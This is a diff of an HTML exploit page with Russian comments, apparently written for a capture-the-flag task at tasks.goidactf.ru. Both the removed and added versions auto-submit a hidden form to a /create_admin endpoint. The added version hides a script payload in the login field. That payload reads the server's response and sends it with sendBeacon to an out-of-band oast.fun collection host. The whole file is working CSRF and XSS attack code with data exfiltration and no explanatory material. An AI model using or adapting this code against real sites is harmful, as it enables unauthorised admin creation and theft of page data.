@@ -1,39 +1,32 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="resultFrame" name="resultFrame" style="display:none"></iframe>
-
-<form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST" target="resultFrame">
-    <input type="hidden" name="new_admin_login" value="hacker_2026_flag">
-</form>
-
+<iframe id="n" sandbox="allow-scripts allow-forms" style="display:none"></iframe>
 <script>
-// Отправляем форму
-document.getElementById('p').submit();
+const inner = `
+  <!DOCTYPE html>
+  <html>
+  <body>
+  <form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
+    <input type="hidden" name="new_admin_login" value="<script>parent.postMessage({type:'xss',data:document.body.innerHTML},'*')<\/script>">
+  </form>
+  <script>
+    document.getElementById('p').submit();
+  <\/script>
+  </body>
+  </html>
+`;
+document.getElementById('n').srcdoc = inner;
 
-// Слушаем загрузку iframe
-document.getElementById('resultFrame').onload = function() {
-  setTimeout(() => {
-    try {
-      // Пытаемся прочитать iframe с результатом
-      const iframe = document.getElementById('resultFrame');
-      const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-      const result = iframeDoc.body.innerHTML;
-      
-      // Отправляем результат
-      navigator.sendBeacon(
-        "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture",
-        result.substring(0, 2000)
-      );
-    } catch(e) {
-      // CORS блокирует чтение
-      navigator.sendBeacon(
-        "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/error",
-        "CORS blocked: " + e.message
-      );
-    }
-  }, 1000);
-};
+window.addEventListener("message", e => {
+  if (e.data && e.data.type === 'xss') {
+    // XSS сработала! Получили ответ сервера
+    navigator.sendBeacon(
+      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/xss_capture",
+      e.data.data.substring(0, 2000)
+    );
+  }
+});
 </script>
 </body>
 </html>
